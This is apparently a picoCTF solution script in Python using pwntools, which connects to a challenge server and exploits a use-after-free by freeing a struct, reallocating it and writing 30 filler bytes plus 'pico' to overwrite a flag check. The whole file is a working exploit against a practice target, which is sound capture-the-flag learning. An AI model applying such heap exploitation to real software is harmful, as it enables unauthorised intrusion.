from pwn import *

# Setup connection
host = 'tethys.picoctf.net'
port = 62508
p = remote(host, port)

# Step 1: Initialize the struct (done automatically by init function)

# Step 2: Free the memory (option 5)
p.sendlineafter("choice: ", '5')  # Free x

# Step 3: Allocate memory and overwrite the flag (option 2)
p.sendlineafter("choice: ", '2')  # Allocate new object
p.sendlineafter("allocation: ", '34')  # Allocate enough space to overwrite the flag (Need 30 characters and pico value which is at least 34 characters)
p.sendlineafter("Data for flag: ", 30*'a' + 'pico')  # Overwrite flag with "pico", write 30 character of anything to bypass a[10],b[10],c[10] and overwrite flag value

# Step 4: Trigger check_win() (option 4) to print the flag
p.sendlineafter("choice: ", '4')  # Trigger the win condition

# Get the flag
p.interactive()
